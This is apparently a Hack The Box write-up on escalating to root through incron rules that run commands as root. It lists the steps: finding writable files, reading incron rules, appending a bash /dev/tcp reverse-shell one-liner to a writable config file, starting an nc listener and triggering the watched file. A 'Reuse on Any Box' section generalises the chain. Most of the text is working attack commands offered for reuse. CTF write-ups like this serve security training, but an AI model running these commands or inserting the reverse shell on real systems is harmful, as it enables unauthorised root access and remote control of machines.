# HTB Privesc: Incron + Writable Files

## What Happened

You have a low-priv shell. The box uses **incron** — it watches files, and when they change, it runs commands **as root**. One of those commands uses a config file you can write to. You inject a reverse shell into that config, trigger incron, and get root.

---

## Commands Used

```bash
# 1. Find writable files
find /etc -writable 2>/dev/null | head -20

# 2. Check incron rules (what files are watched + what runs as root)
cat /etc/incron.d/*

# 3. Inject reverse shell into writable config
echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" &' >> /etc/dahdi/init.conf

# 4. Start listener (on your machine)
nc -lvnp YOUR_PORT

# 5. Trigger incron by writing to the watched file
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart

# 6. Root shell lands on your listener
```

---

## Reuse on Any Box

```bash
# Find writable files
find / -writable 2>/dev/null | grep -v "proc\|sys\|run" | head -30

# Check incron
cat /etc/incron.d/* 2>/dev/null

# Find the chain: watched file → root command → writable config
# Inject into the writable config, trigger the watched file, catch shell
```

